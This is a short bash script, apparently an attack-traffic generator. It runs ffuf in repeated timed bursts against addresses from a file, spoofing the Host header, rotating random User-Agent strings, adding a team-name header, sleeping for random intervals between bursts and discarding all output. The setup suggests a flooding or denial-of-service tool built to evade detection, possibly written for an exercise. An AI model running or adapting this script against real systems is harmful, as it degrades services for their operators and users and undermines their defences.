#!/bin/bash
HOST=${1}
TEAM=${2}
RUNS=${3}
ATTACKTIME=${4}
IDLETIME=${5}
PARALLEL=${6} #default 40
TO=3
REGIONS="dscqehn.txt"
UAS="ua.txt"

for run in $( seq 1 ${RUNS} ); do
        UA=$(cat ${UAS} | sort -R  | head -1)
#-rate ${PARALLEL}
        ./ffuf -w ${REGIONS} -u http://FUZZ/target.html -H "teamname: ${TEAM}" -H "User-Agent: ${UA}" -H "Host: ${HOST}" -mc 0 -ignore-body -timeout ${TO} -maxtime ${ATTACKTIME} -t ${PARALLEL} ${OPT} -s &> /dev/null
        sleep "$(( $RANDOM % ${IDLETIME} ))"
done 